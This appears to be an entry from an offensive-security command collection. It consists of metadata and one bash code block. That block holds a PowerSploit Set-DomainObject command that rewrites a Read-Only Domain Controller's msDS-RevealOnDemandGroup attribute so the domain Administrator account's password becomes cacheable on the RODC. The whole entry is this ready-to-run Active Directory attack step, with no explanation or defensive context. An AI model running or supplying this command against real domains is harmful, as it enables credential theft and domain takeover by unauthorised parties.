---
id: d0810f67-5026-465e-8e72-68bcecb8d1bb
name: Set Domain Object
type: command
executor: bash
data: PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed
  RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
output: null
created_at: '2023-04-06T03:56:08.358731+00:00'
updated_at: '2023-04-10T20:26:02.550837+00:00'
---

# Set Domain Object

```bash
PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
```
